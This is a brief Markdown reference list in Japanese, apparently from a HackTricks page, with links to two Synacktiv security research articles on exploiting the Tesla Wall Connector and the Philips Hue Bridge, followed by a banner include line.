- [7] [Synacktiv - Tesla Wall Connector の充電ポートコネクターからの悪用 - Part 2: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
